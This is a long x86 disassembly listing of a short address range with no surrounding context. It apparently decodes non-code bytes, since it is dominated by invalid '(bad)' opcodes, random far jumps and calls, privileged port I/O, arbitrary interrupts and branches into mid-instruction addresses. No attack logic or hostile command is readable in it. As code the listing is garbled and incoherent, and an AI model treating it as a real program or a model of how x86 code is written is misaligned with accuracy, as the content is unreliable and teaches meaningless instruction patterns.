  4195c2:	jmp    0x7491:0x6ef678df
  4195c9:	mov    edx,0xe4c8f07a
  4195ce:	test   dh,ah
  4195d0:	fld    QWORD PTR [edx]
  4195d2:	bound  ebx,QWORD PTR [esi+0x4b]
  4195d5:	inc    ebp
  4195d6:	sub    eax,0x5dd9c3b3
  4195db:	sub    ecx,edx
  4195dd:	aas    
  4195de:	push   ds
  4195df:	jno    0x41956c
  4195e1:	pop    ebp
  4195e2:	mov    esi,?
  4195e4:	jp     0x4195e9
  4195e6:	dec    di
  4195e8:	mov    es,edx
  4195ea:	imul   ebp,DWORD PTR [ebx-0x5f],0x4e
  4195ee:	add    ah,BYTE PTR [eax+ecx*4]
  4195f1:	add    ebx,DWORD PTR [ebp+0x6ef5b395]
  4195f7:	lods   eax,DWORD PTR ds:[esi]
  4195f8:	sub    ah,BYTE PTR [esi+eiz*8]
  4195fb:	ret    0x57d1
  4195fe:	fisub  WORD PTR [edi+0x544a106a]
  419604:	mov    ecx,ecx
  419606:	add    al,BYTE PTR [ecx+0x4f]
  419609:	retf   
  41960a:	in     al,dx
  41960b:	std    
  41960c:	and    DWORD PTR [edx],eax
  41960e:	pusha  
  41960f:	mov    eax,ds:0x5202d0d5
  419614:	xchg   esp,eax
  419615:	fisttp WORD PTR [edi-0x1e]
  419618:	mov    ah,BYTE PTR [ebx+0x43e807d6]
  41961e:	mov    al,ds:0x23728f2
  419623:	aam    0x8b
  419625:	sub    al,0x52
  419627:	in     eax,0x8a
  419629:	popa   
  41962a:	dec    ebp
  41962b:	jge    0x4195b5
  41962d:	xchg   esp,ebp
  41962f:	cmp    ecx,DWORD PTR [esi-0x5e]
  419632:	sbb    ebx,esp
  419634:	stos   BYTE PTR es:[edi],al
  419635:	add    dh,BYTE PTR [esi]
  419637:	push   esi
  419638:	ins    DWORD PTR es:[edi],dx
  419639:	lods   eax,DWORD PTR ds:[esi]
  41963a:	retf   0x319e
  41963d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41963e:	pusha  
  41963f:	mov    eax,ds:0x64b0c5b7
  419644:	inc    esp
  419645:	mov    eax,ds:0x28614b5
  41964a:	pushf  
  41964b:	adc    cl,cl
  41964d:	lahf   
  41964e:	es jo  0x41960e
  419651:	aaa    
  419652:	ds inc edi
  419654:	mov    BYTE PTR [edi],al
  419656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419657:	dec    eax
  419658:	xchg   DWORD PTR [edi+0x35f03a5],edx
  41965e:	cmp    BYTE PTR [edi+0x4e45fd51],al
  419664:	lock (bad) 
  419666:	pop    ds
  419667:	pop    ecx
  419668:	inc    esp
  419669:	dec    ecx
  41966a:	xchg   ebx,eax
  41966b:	into   
  41966c:	lods   al,BYTE PTR ds:[esi]
  41966d:	addr16 push esi
  41966f:	fwait
  419670:	arpl   WORD PTR [edi+eiz*2-0x2c],ax
  419674:	adc    DWORD PTR [ebx],ebx
  419676:	mov    edx,0x65fddf07
  41967b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41967c:	enter  0xc4d0,0x79
  419680:	jb     0x419625
  419682:	clc    
  419683:	stc    
  419684:	sbb    DWORD PTR [ebx],eax
  419686:	(bad)  
  419687:	fs jmp 0x8acacd72
  41968d:	adc    bl,BYTE PTR [ecx]
  41968f:	repnz xchg edi,eax
  419691:	fistp  QWORD PTR [ecx+0x3e]
  419694:	jmp    0x85cc:0x1ac82c85
  41969b:	scas   eax,DWORD PTR es:[edi]
  41969c:	xchg   edi,eax
  41969d:	sbb    BYTE PTR [ebx+0x58831beb],al
  4196a3:	pop    es
  4196a4:	adc    bl,bl
  4196a6:	call   0xa0a1:0xf4058453
  4196ad:	xchg   ebp,eax
  4196ae:	ficomp DWORD PTR ds:0x50a602d2
  4196b4:	int    0x37
  4196b6:	add    edx,DWORD PTR [edx+0x56]
  4196b9:	inc    edx
  4196ba:	pusha  
  4196bb:	mov    ebx,0xa16f9001
  4196c0:	inc    ebx
  4196c1:	or     al,0xc8
  4196c3:	sub    dl,BYTE PTR ds:[edx+esi*4]
  4196c7:	js     0x419711
  4196c9:	mov    ecx,0xb754b568
  4196ce:	repz lea ebx,[ebx-0x278efa15]
  4196d5:	add    BYTE PTR [ebx+edx*1+0x2cd79a56],ah
  4196dc:	stc    
  4196dd:	add    dl,BYTE PTR [esp+edx*2]
  4196e0:	cmp    BYTE PTR [ecx+0x6a],0x9a
  4196e4:	and    ch,BYTE PTR [ecx+0x31972bb8]
  4196ea:	pop    ebx
  4196eb:	jmp    0x84f1aee9
  4196f0:	sar    BYTE PTR [eax+0x5f],1
  4196f3:	mov    al,0xc9
  4196f5:	outs   dx,BYTE PTR ds:[esi]
  4196f6:	dec    bx
  4196f8:	adc    DWORD PTR [edx],edx
  4196fa:	jnp    0x4196b0
  4196fc:	int    0x8a
  4196fe:	sub    BYTE PTR [ecx+ecx*4],0x69
  419702:	lds    esp,FWORD PTR [ebx]
  419704:	stos   DWORD PTR es:[edi],eax
  419705:	mov    ebp,0x144e6607
  41970a:	enter  0xa7af,0xe4
  41970e:	push   edx
  41970f:	push   ebp
  419710:	xor    eax,0x880b0de3
  419715:	sbb    eax,0xa30583db
  41971a:	xchg   ebx,eax
  41971b:	ds xor ah,dl
  41971e:	cwde   
  41971f:	aad    0x45
  419721:	pop    ebx
  419722:	(bad)  
  419723:	fbstp  TBYTE PTR [ebx+esi*1]
  419726:	into   
  419727:	mov    cl,0x89
  419729:	int    0x9f
  41972b:	and    ebp,edx
  41972d:	push   esi
  41972e:	xchg   edx,eax
  41972f:	int    0x9d
  419731:	or     bh,BYTE PTR [esi-0x37]
  419734:	pop    ebx
  419735:	add    ah,BYTE PTR [esi]
  419737:	mov    ds:0x6091cc7b,al
  41973c:	pop    ss
  41973d:	shl    BYTE PTR [eax+0x5],0x48
  419741:	add    DWORD PTR [eax],eax
  419743:	sub    BYTE PTR [eax+0x52],dh
  419746:	rcl    edx,1
  419748:	mov    eax,0x3ca3d4c9
  41974d:	retf   
  41974e:	scas   eax,DWORD PTR es:[edi]
  41974f:	pop    edx
  419750:	jbe    0x4196f8
  419752:	pop    ds
  419753:	add    edx,DWORD PTR [esi+0x246429dc]
  419759:	sub    BYTE PTR [ebx+0x18f5aed4],dh
  41975f:	gs jle 0x41973e
  419762:	out    dx,al
  419763:	mov    WORD PTR [ecx+0x4f],gs
  419766:	pop    ds
  419767:	popf   
  419768:	jg     0x419755
  41976a:	retf   
  41976b:	int    0x36
  41976d:	pop    ebp
  41976e:	dec    eax
  41976f:	mov    eax,0x5627fc92
  419774:	dec    eax
  419775:	icebp  
  419776:	or     eax,0x97b12c45
  41977b:	add    ebx,eax
  41977d:	dec    ecx
  41977e:	jmp    0x41979c
  419780:	or     DWORD PTR [esi+0x36],esi
  419783:	and    eax,0xdd33e723
  419788:	out    dx,eax
  419789:	sbb    eax,0x479eb11a
  41978e:	and    DWORD PTR [edi-0x25],edx
  419791:	shl    DWORD PTR [ebx+0x1795b7e9],0x21
  419798:	or     DWORD PTR [ebx+0x68280a51],edi
  41979e:	mov    eax,0x973c8ed4
  4197a3:	dec    edi
  4197a4:	fadd   QWORD PTR [edi+0x7d]
  4197a7:	xchg   DWORD PTR [ecx-0x354e561d],ecx
  4197ad:	xchg   edi,edx
  4197af:	lds    edx,FWORD PTR [ecx+0x18]
  4197b2:	inc    eax
  4197b3:	out    0x2,eax
  4197b5:	popa   
  4197b6:	jmp    0x36c24754
  4197bb:	jbe    0x4197e7
  4197bd:	outs   dx,DWORD PTR ds:[esi]
  4197be:	(bad)  
  4197bf:	out    dx,al
  4197c0:	call   0xd09f1897
  4197c5:	ffreep st(7)
  4197c7:	adc    cl,BYTE PTR [eax+0x36af14d7]
  4197cd:	jge    0x419831
  4197cf:	aam    0x33
  4197d1:	adc    esp,ebx
  4197d3:	sub    eax,0xa01eea6c
  4197d8:	mov    bh,0x3b
  4197da:	(bad)  
  4197dc:	mov    esp,ebp
  4197de:	dec    edi
  4197df:	pushf  
  4197e0:	les    ebx,FWORD PTR [ecx-0x114d0fc6]
  4197e6:	mov    al,0xd0
  4197e8:	mov    esp,0x5380c78e
  4197ed:	mul    DWORD PTR ds:0x9acaa916
  4197f3:	pop    esp
  4197f4:	mov    DWORD PTR ds:0xda259a2d,ebp
  4197fa:	(bad)
  4197fe:	push   0x7f
  419800:	retf   0x580c
  419803:	iret   
  419804:	mov    ebx,esi
  419806:	mov    edi,0x240cfc23
  41980b:	xlat   BYTE PTR ds:[ebx]
  41980c:	adc    DWORD PTR [esi+0x3a9a4fb3],0x4c
  419813:	xor    ah,BYTE PTR [eax+0x7bcf04cf]
  419819:	inc    ebp
  41981a:	jp     0x4197a5
  41981c:	or     DWORD PTR [ebx],ecx
  41981e:	js     0x419852
  419820:	push   eax
  419821:	sub    bh,dl
  419823:	aad    0xca
  419825:	push   ds
  419826:	loope  0x4197b8
  419828:	and    BYTE PTR [ecx+0x5589dba8],0xdf
  41982f:	pop    edi
  419830:	ror    ch,cl
  419832:	mov    bh,0x60
  419834:	jae    0x419838
  419836:	push   cs
  419837:	sbb    esi,DWORD PTR [edx-0x208cc799]
  41983d:	xchg   esp,eax
  41983e:	pop    ds
  41983f:	jne    0x419800
  419841:	repz rol BYTE PTR [ecx-0x20],0x2b
  419846:	mov    ecx,0x4702d69b
  41984b:	aad    0xe1
  41984d:	inc    edx
  41984e:	jbe    0x4197d7
  419850:	fld    DWORD PTR [ebp+0x1f]
  419853:	inc    edi
  419854:	call   0xfec3:0x650e075
  41985b:	aam    0x85
  41985d:	mov    al,0xf1
  41985f:	cmp    eax,DWORD PTR [edi]
  419861:	in     al,0x65
  419863:	sbb    cl,BYTE PTR [ecx-0x2066b347]
  419869:	xor    BYTE PTR [edx],cl
  41986b:	fsub   st(5),st
  41986d:	dec    edx
  41986e:	(bad)  
  41986f:	sub    eax,0x1874833a
  419874:	sub    al,0xc3
  419876:	xor    al,0xbd
  419878:	mov    DWORD PTR [ecx+0x3f],esi
  41987b:	data16 das 
  41987d:	push   edx
  41987e:	and    DWORD PTR [edi+esi*8+0x5],eax
  419882:	or     al,0xef
  419884:	pop    edx
  419885:	jnp    0x4198d5
  419887:	mov    eax,ds:0xdf60d211
  41988c:	fwait
  41988d:	or     al,0x65
  41988f:	cmp    bl,ah
  419891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419892:	xlat   BYTE PTR ds:[ebx]
  419894:	loope  0x4198e2
  419896:	jmp    0x88a1:0xc1639357
  41989d:	test   eax,0x368da65b
  4198a2:	and    bh,BYTE PTR [ecx+0x14]
  4198a5:	shl    esi,cl
  4198a7:	cwde   
  4198a8:	lods   eax,DWORD PTR ds:[esi]
  4198a9:	jno    0x419842
  4198ab:	scas   al,BYTE PTR es:[edi]
  4198ac:	or     ch,0x1
  4198af:	jge    0x4198ba
  4198b1:	jno    0x4198cb
  4198b3:	xchg   ebx,eax
  4198b4:	hlt    
  4198b5:	add    ebx,DWORD PTR [eax+eiz*1+0x20]
  4198b9:	ror    DWORD PTR [ecx-0x61],cl
  4198bc:	cdq    
  4198bd:	hlt    
  4198be:	shl    ah,0x33
  4198c1:	sub    DWORD PTR ds:0x469fd50e,ebx
  4198c7:	ret    
  4198c8:	mov    bh,ah
  4198ca:	test   eax,0x550cf0a2
  4198cf:	xlat   BYTE PTR ds:[ebx]
  4198d0:	outs   dx,BYTE PTR ds:[esi]
  4198d1:	fs mov al,0x88
  4198d4:	(bad)  
  4198d5:	in     al,dx
  4198d6:	and    BYTE PTR [edi+0x760dbb8],dl
  4198dc:	fwait
  4198dd:	sub    ah,BYTE PTR [edx-0x2f]
  4198e0:	xor    al,0xf9
  4198e2:	(bad)  
  4198e3:	aam    0x99
  4198e5:	or     bl,BYTE PTR fs:[ecx]
  4198e8:	mov    ebx,eax
  4198ea:	ret    
  4198eb:	(bad)  
  4198ed:	imul   esi,DWORD PTR [esi+edx*8+0x39ea0ebe],0x54c65c4d
  4198f8:	sbb    DWORD PTR [ebx],eax
  4198fa:	clc    
  4198fb:	push   es
  4198fc:	or     eax,0xb11f92e9
  419901:	cdq    
  419902:	pusha  
  419903:	mov    DWORD PTR [esi-0x510681da],esp
  419909:	inc    ebp
  41990a:	pop    ds
  41990b:	aam    0xc1
  41990d:	cmp    BYTE PTR [edi],dl
  41990f:	sbb    al,0x4c
  419911:	in     eax,dx
  419912:	push   ss
  419913:	ror    DWORD PTR [ecx-0x5ca72661],0x45
  41991a:	xor    al,0xb2
  41991c:	std    
  41991d:	add    eax,0x305037fa
  419922:	push   esi
  419923:	inc    esi
  419924:	adc    edx,DWORD PTR [ecx]
  419926:	inc    ebp
  419927:	stos   DWORD PTR es:[edi],eax
  419928:	push   ds
  419929:	mov    bh,0x5e
  41992b:	lea    ecx,[ecx]
  41992d:	lahf   
  41992e:	cmp    eax,0xe1f2f315
  419933:	retf   0x4892
  419936:	add    al,0x9d
  419938:	inc    esp
  419939:	add    cl,BYTE PTR [ebp+0x703924a4]
  41993f:	arpl   WORD PTR [eax+0x53b4e239],cx
  419945:	xchg   DWORD PTR [eax],edi
  419947:	sub    bl,dh
  419949:	in     eax,0xcc
  41994b:	aad    0xb5
  41994d:	dec    edi
  41994e:	sub    al,0xf1
  419950:	nop
  419951:	stos   BYTE PTR es:[edi],al
  419952:	mov    edi,0xeee589a3
  419957:	push   esp
  419958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419959:	or     eax,0x1fb92d5e
  41995e:	hlt    
  41995f:	pushf  
  419960:	push   ss
  419961:	lock jno 0x41993b
  419964:	or     BYTE PTR [ebp+0xb897c9e],bh
  41996a:	outs   dx,DWORD PTR ds:[esi]
  41996b:	mov    ch,BYTE PTR [eax]
  41996d:	inc    esp
  41996e:	mov    DWORD PTR [ebx+0x59],0x8c2f1dc3
  419975:	xor    dl,al
  419977:	jbe    0x41990d
  419979:	iret   
  41997a:	aas    
  41997b:	ror    BYTE PTR [edi+0x2],1
  41997e:	je     0x41996f
  419980:	aaa    
  419981:	mov    DWORD PTR [edx],eax
  419983:	imul   edi,DWORD PTR [edx+0x57b89c16],0x6f
  41998a:	pop    ds
  41998b:	pop    esi
  41998c:	popa   
  41998d:	sbb    al,0x76
  41998f:	je     0x4199d7
  419991:	xchg   ebx,eax
  419992:	xchg   esp,eax
  419993:	scas   eax,DWORD PTR es:[edi]
  419994:	sbb    DWORD PTR [ebx+0x41441503],0x8bba109f
  41999e:	adc    edx,esp
  4199a0:	xor    DWORD PTR [edi+ecx*4],eax
  4199a3:	jmp    0x2e6d:0xd359b404
  4199aa:	push   ds
  4199ab:	jecxz  0x419a18
  4199ad:	mov    al,0x76
  4199af:	push   ecx
  4199b0:	push   ds
  4199b1:	mov    eax,DWORD PTR [edi-0x2c]
  4199b4:	nop
  4199b5:	pop    ebp
  4199b6:	cmp    esp,edi
  4199b8:	ds xor eax,0x238f4cab
  4199be:	jns    0x4199ed
  4199c0:	sub    al,0xf1
  4199c2:	mov    ebp,0xd98fac24
  4199c7:	sar    BYTE PTR [eax+0x68],cl
  4199ca:	inc    edi
  4199cb:	fisttp WORD PTR [edx+0x57]
  4199ce:	sub    eax,0xf80f7fd7
  4199d3:	mov    ds:0x7172c588,al
  4199d8:	arpl   dx,dx
  4199da:	mov    ebx,0x4c05d0a9
  4199df:	je     0x4199e0
  4199e1:	sbb    ecx,DWORD PTR [esp+edx*8-0x15af7441]
  4199e8:	mov    ah,BYTE PTR [ecx+0x276db13a]
  4199ee:	imul   esi,DWORD PTR [eax+edx*2],0x45d4dc2f
  4199f5:	sub    al,0xad
  4199f7:	cmc    
  4199f8:	stc    
  4199f9:	xor    bl,al
  4199fb:	cmp    ecx,DWORD PTR [ecx-0x5adb4093]
  419a01:	inc    edi
  419a02:	mov    ds:0x98036351,eax
  419a07:	fdivr  DWORD PTR ds:[edi-0x51]
  419a0b:	in     al,0xb8
  419a0d:	sub    eax,0x7246f31f
  419a12:	bound  esi,QWORD PTR [edi]
  419a14:	(bad)  
  419a15:	pusha  
  419a16:	pop    edi
  419a17:	in     eax,dx
  419a18:	mov    bl,0xdc
  419a1a:	mov    al,ds:0x1eda9aa5
  419a1f:	mov    ebx,0x2212b833
  419a24:	inc    esi
  419a25:	mov    ebp,0x38757426
  419a2a:	repz xchg ebp,eax
  419a2c:	mov    BYTE PTR [ebp-0x7e7d3197],ch
  419a32:	fdivr  QWORD PTR [edi]
  419a34:	dec    edx
  419a35:	add    ah,al
  419a37:	int    0x67
  419a39:	fild   WORD PTR [ebx+0xb]
  419a3c:	cmp    ah,BYTE PTR [ebp-0x1]
  419a3f:	jecxz  0x419a7c
  419a41:	xchg   ebp,eax
  419a42:	adc    dl,dh
  419a44:	mov    ds,WORD PTR [ecx+0x56]
  419a47:	push   0x1577c3ce
  419a4c:	sti    
  419a4d:	push   ebp
  419a4e:	jmp    0xa042cb13
  419a53:	jle    0x419a29
  419a55:	inc    DWORD PTR [edi+0x7]
  419a58:	test   eax,0x945e9bc2
  419a5d:	mov    cl,0xc
  419a5f:	call   0xaac3:0xb77c85f0
  419a66:	xchg   esi,eax
  419a67:	imul   eax,DWORD PTR [edx-0x6c],0xb9acd4ba
  419a6e:	movhps QWORD PTR [ebx+eax*1-0x395244a0],xmm0
  419a76:	icebp  
  419a77:	jge    0x419ab2
  419a79:	mov    edi,?
  419a7b:	lods   al,BYTE PTR ds:[esi]
  419a7c:	xor    al,BYTE PTR [edx]
  419a7e:	nop
  419a7f:	out    dx,eax
  419a80:	scas   eax,DWORD PTR es:[edi]
  419a81:	and    DWORD PTR [edx],edi
  419a83:	inc    edi
  419a84:	mov    edx,0xf18d58a6
  419a89:	pop    eax
  419a8a:	int    0xd2
  419a8c:	adc    DWORD PTR [ebp-0x27],0xfffffff8
  419a90:	mov    BYTE PTR [esi+0x32dad0c],bh
  419a96:	bound  eax,QWORD PTR [ecx-0x44]
  419a99:	hlt    
  419a9a:	sbb    al,0x2e
  419a9c:	retf   0x6006
  419a9f:	mov    ecx,0xc4591aed
  419aa4:	push   esi
  419aa5:	mov    BYTE PTR [esp+edx*8+0x7c],ah
  419aa9:	arpl   WORD PTR [ebp+0x5aae0118],di
  419aaf:	daa    
  419ab0:	mov    DWORD PTR [ebx-0x1f83d9],edi
  419ab6:	ins    DWORD PTR es:[edi],dx
  419ab7:	out    0xb0,eax
  419ab9:	sbb    BYTE PTR [edx+0x1aed41ce],bl
  419abf:	scas   al,BYTE PTR es:[edi]
  419ac0:	repnz add cl,BYTE PTR [ebx]
  419ac3:	mov    DWORD PTR [esi],esi
  419ac5:	mov    ecx,0xe07d9b1f
  419aca:	aad    0xae
  419acc:	je     0x419aa1
  419ace:	stos   BYTE PTR es:[edi],al
  419acf:	mov    ebx,0x683d0112
  419ad4:	enter  0x9c2d,0x48
  419ad8:	inc    ebp
  419ad9:	mov    eax,0x7798155c
  419ade:	pop    ds
  419adf:	outs   dx,BYTE PTR ds:[esi]
  419ae0:	pop    eax
  419ae1:	dec    ecx
  419ae2:	jno    0x419a9b
  419ae4:	mov    eax,0xc34585a7
  419ae9:	add    edx,esp
  419aeb:	and    eax,0xf0850c52
  419af0:	xor    BYTE PTR [ebp-0x1d442ba9],bl
  419af6:	mov    al,0xc1
  419af8:	shl    DWORD PTR [edx],1
  419afa:	and    al,0x2f
  419afc:	ins    DWORD PTR es:[edi],dx
  419afd:	xor    DWORD PTR [ebx+eiz*8+0x74],edi
  419b01:	push   ss
  419b02:	pop    esi
  419b03:	adc    al,0xe0
  419b05:	call   edx
  419b07:	jnp    0x419b13
  419b09:	add    edx,DWORD PTR [eax]
  419b0b:	inc    ebx
  419b0c:	into   
  419b0d:	or     ecx,DWORD PTR [esi]
  419b0f:	xor    al,0xc
  419b11:	sti    
  419b12:	pusha  
  419b13:	ins    DWORD PTR es:[edi],dx
  419b14:	cmp    eax,0x543e4464
  419b19:	push   0xffffffe4
  419b1b:	lods   eax,DWORD PTR ds:[esi]
  419b1c:	jnp    0x419b53
  419b1e:	sbb    ah,bl
  419b20:	xchg   edi,eax
  419b21:	sbb    al,0xab
  419b23:	test   eax,0x56136f39
  419b28:	mov    dh,0x97
  419b2a:	scas   al,BYTE PTR es:[edi]
  419b2b:	xor    DWORD PTR [edx],ecx
  419b2d:	sub    dh,BYTE PTR [esi]
  419b2f:	sbb    al,BYTE PTR cs:0x32b0ac7
  419b36:	jo     0x419b2f
  419b38:	cwde   
  419b39:	mov    ch,0x14
  419b3b:	(bad)  
  419b3c:	in     eax,dx
  419b3d:	sbb    bl,BYTE PTR [esi]
  419b3f:	in     eax,dx
  419b40:	arpl   WORD PTR [ecx+0x3a60e068],si
  419b46:	imul   esp,DWORD PTR [edi+0x28c7eb14],0x1d78bf89
  419b50:	mov    ds:0x12db1f9b,al
  419b55:	in     eax,dx
  419b56:	xchg   ecx,eax
  419b57:	mov    eax,0x9a5e3658
  419b5c:	xlat   BYTE PTR ds:[ebx]
  419b5d:	mov    ebx,0xf88456f
  419b62:	outs   dx,DWORD PTR ds:[esi]
  419b63:	push   es
  419b64:	xchg   ecx,eax
  419b65:	inc    ebx
  419b66:	nop
  419b67:	lods   eax,DWORD PTR ds:[esi]
  419b68:	mov    BYTE PTR [edi],dh
  419b6a:	xor    DWORD PTR [ebx-0x79],0x1a
  419b6e:	aam    0x77
  419b70:	push   0x8d3b4603
  419b75:	push   eax
  419b76:	inc    ebp
  419b77:	sahf   
  419b78:	nop
  419b79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b7a:	jle    0x419b55
  419b7c:	inc    edi
  419b7d:	adc    BYTE PTR [edx],bh
  419b7f:	push   edi
  419b80:	sbb    BYTE PTR [edx],bl
  419b82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b83:	out    0xe7,eax
  419b85:	add    eax,0xf9ec1c5c
  419b8a:	iret   
  419b8b:	mov    ecx,0x3d279d68
  419b90:	mov    BYTE PTR [ecx],al
  419b92:	add    bl,dh
  419b94:	mov    eax,0x13979d8c
  419b99:	and    cl,BYTE PTR [ebx]
  419b9b:	aaa    
  419b9c:	out    dx,al
  419b9d:	jg     0x419b7c
  419b9f:	mov    ebx,0x8495ebfc
  419ba4:	(bad)  
  419ba5:	xor    BYTE PTR [esi+0x62340338],bl
  419bab:	jmp    0x79d8:0xf6a13587
  419bb2:	mov    edx,0xd2b69555
  419bb7:	pop    ebx
  419bb8:	rol    DWORD PTR ds:0x8d354168,cl
  419bbe:	fnstcw WORD PTR [ecx-0x69]
  419bc1:	or     DWORD PTR [ecx-0x17],ebp
  419bc4:	jmp    0xaf02:0xfcf762b3
  419bcb:	fmulp  st(2),st
  419bcd:	gs jo  0x419c41
  419bd0:	scas   al,BYTE PTR es:[edi]
  419bd1:	push   ebx
  419bd2:	xor    eax,0x4975bed1
  419bd7:	fst    DWORD PTR [eax]
  419bd9:	mov    esp,DWORD PTR [edi-0x2c]
  419bdc:	push   ebx
  419bdd:	rcl    BYTE PTR [ebx+ebx*1+0x11],1
  419be1:	xchg   esi,eax
  419be2:	sub    edi,0xf318ad88
  419be8:	aam    0x4b
  419bea:	scas   eax,DWORD PTR es:[edi]
  419beb:	into   
  419bec:	pop    ebx
  419bed:	ficomp WORD PTR [edx+0x53244879]
  419bf3:	aam    0x7f
  419bf5:	sbb    DWORD PTR [eax+0x7e8f724a],0x1a238e5b
  419bff:	xchg   edi,eax
  419c00:	pop    ecx
  419c01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c02:	mov    bh,0x0
  419c04:	das    
  419c05:	stc    
  419c06:	retf   
  419c07:	inc    ebx
  419c08:	mov    dl,0xc8
  419c0a:	pusha  
  419c0b:	js     0x419c20
  419c0d:	pushf  
  419c0e:	ret    
  419c0f:	cdq    
  419c10:	mov    bh,0xd7
  419c12:	and    al,0x65
  419c14:	mov    DWORD PTR [edi+0x55],ebx
  419c17:	outs   dx,DWORD PTR ds:[esi]
  419c18:	xchg   ecx,eax
  419c19:	shl    BYTE PTR [ebx+0x5a],0xba
  419c1d:	mov    dl,0xcf
  419c1f:	xlat   BYTE PTR ds:[ebx]
  419c20:	mov    bh,bh
  419c22:	xchg   ebp,eax
  419c23:	bound  esi,QWORD PTR [edi]
  419c25:	and    bl,cl
  419c27:	mov    edi,DWORD PTR cs:[ebp+0x4bc9c4b]
  419c2e:	sahf   
  419c2f:	pusha  
  419c30:	jp     0x419c87
  419c32:	daa    
  419c33:	fldenv [ebx-0x2e602e5b]
  419c39:	add    edi,esi
  419c3b:	out    0xe4,eax
  419c3d:	in     al,dx
  419c3e:	sub    al,0x42
  419c40:	cmp    BYTE PTR [edx+0x5b88bd56],0x64
  419c47:	retf   0x371e
  419c4a:	cmp    bh,BYTE PTR [edi+0x6d]
  419c4d:	add    edx,DWORD PTR [edx+0x67640796]
  419c53:	xchg   DWORD PTR [eax],edx
  419c55:	mov    ds:0xb8780b6d,al
  419c5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c5b:	in     al,0x68
  419c5d:	mov    BYTE PTR [esi+0x3d],ch
  419c60:	out    0x26,al
  419c62:	or     al,0xe0
  419c64:	(bad)  
  419c65:	punpcklbw mm1,DWORD PTR [ebx+0xf1ef50]
  419c6c:	dec    esp
  419c6d:	or     DWORD PTR [edx],ebx
  419c6f:	not    ch
  419c71:	fwait
  419c72:	sub    ebp,edx
  419c74:	xchg   edi,eax
  419c75:	rcr    esi,1
  419c77:	(bad)  
  419c78:	inc    DWORD PTR [edi+0x17]
  419c7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c7c:	pusha  
  419c7d:	cmp    esp,DWORD PTR ds:0xc65918d7
  419c83:	ret    0xddbe
  419c86:	ret    0x58b8
  419c89:	not    DWORD PTR [ebp+0x4b1c23a1]
  419c8f:	mov    ch,0xf8
  419c91:	js     0x419c65
  419c93:	adc    al,0x64
  419c95:	pop    ebp
  419c96:	out    dx,al
  419c97:	stos   DWORD PTR es:[edi],eax
  419c98:	repnz adc cl,BYTE PTR [edi+0x498020af]
  419c9f:	sbb    cl,ch
  419ca1:	repnz push eax
  419ca3:	cld    
  419ca4:	mov    ebx,edi
  419ca6:	xor    bl,bh
  419ca8:	xchg   esi,eax
  419ca9:	push   ebp
  419caa:	xchg   esi,eax
  419cab:	dec    esp
  419cac:	rol    DWORD PTR [edx],1
  419cae:	add    eax,DWORD PTR ds:[ecx-0x62]
  419cb2:	lea    edi,[edx+0x5f1fc617]
  419cb8:	ins    DWORD PTR es:[edi],dx
  419cb9:	popa   
  419cba:	in     al,0x48
  419cbc:	push   ds
  419cbd:	adc    ecx,DWORD PTR [edx-0x12c06e2c]
  419cc3:	(bad)  
  419cc4:	ins    DWORD PTR es:[edi],dx
  419cc5:	xor    ah,cl
  419cc7:	sbb    al,0x88
  419cc9:	(bad)  
  419ccb:	sbb    BYTE PTR [edi+0x297d02c8],al
  419cd1:	add    al,BYTE PTR [eax+0x53c54dd9]
  419cd7:	mov    WORD PTR [ebp+0x49],gs
  419cda:	jp     0x419c99
  419cdc:	repnz pop ebp
  419cde:	stos   DWORD PTR es:[edi],eax
  419cdf:	aad    0x66
  419ce1:	icebp  
  419ce2:	adc    eax,0x183c2a86
  419ce7:	mov    eax,ds:0x5cfa025e
  419cec:	pop    edx
  419ced:	not    WORD PTR [esi]
  419cf0:	mov    BYTE PTR [ebp+0x1bb566cf],cl
  419cf6:	jp     0x419cc9
  419cf8:	mov    ah,0x6a
  419cfa:	inc    esp
  419cfb:	mov    esp,0x12c218bd
  419d00:	mov    eax,0x3d021c
  419d05:	mov    ah,0x80
  419d07:	ds pop ebp
  419d09:	xor    al,0x1e
  419d0b:	xor    esp,DWORD PTR [si-0x1c]
  419d0f:	xor    ch,al
  419d11:	sahf   
  419d12:	mov    edx,ebp
  419d14:	mov    ebx,0x3fb79c3d
  419d19:	repz xor eax,0x7143f705
  419d1f:	rcr    esi,cl
  419d21:	or     eax,0xd2bd20fc
  419d26:	ds inc ebx
  419d28:	xor    al,0x6a
  419d2a:	mov    esi,0x45a6857
  419d2f:	xlat   BYTE PTR ds:[ebx]
  419d30:	test   DWORD PTR [bp+di],esi
  419d33:	lods   eax,DWORD PTR ds:[esi]
  419d34:	sub    ebp,ebp
  419d36:	pop    ecx
  419d37:	aad    0x98
  419d39:	and    DWORD PTR [edi+0x4a3f05],ebx
  419d3f:	xchg   ebx,eax
  419d40:	adc    BYTE PTR [ebx],al
  419d42:	shr    BYTE PTR [esp+ebx*4],cl
  419d45:	ret    
  419d46:	iret   
  419d47:	mov    bh,0xb9
  419d49:	or     bl,BYTE PTR [ebx+0x6d]
  419d4c:	arpl   WORD PTR [esi-0x1b],bp
  419d4f:	pop    eax
  419d50:	scas   al,BYTE PTR es:[edi]
  419d51:	sbb    eax,0xd9eaf576
  419d56:	push   0x2202acc0
  419d5b:	pop    DWORD PTR [ecx]
  419d5d:	or     al,0x5
  419d5f:	push   edx
  419d60:	loope  0x419d9d
  419d62:	push   ds
  419d63:	sbb    eax,0xfbf16587
  419d68:	jle    0x419d49
  419d6a:	(bad)  
  419d6c:	push   ds
  419d6d:	adc    DWORD PTR [eax],eax
  419d6f:	dec    ecx
  419d70:	mov    ecx,DWORD PTR [eax+0x4c]
  419d73:	sahf   
  419d74:	mov    DWORD PTR [ebx+0x45bb4c25],ebp
  419d7a:	mov    edx,0x8a034f2f
  419d7f:	ins    DWORD PTR es:[edi],dx
  419d80:	cmp    al,0x77
  419d82:	pop    ss
  419d83:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  419d85:	punpckldq mm5,DWORD PTR [ebx-0x48ecb0eb]
  419d8c:	pop    esi
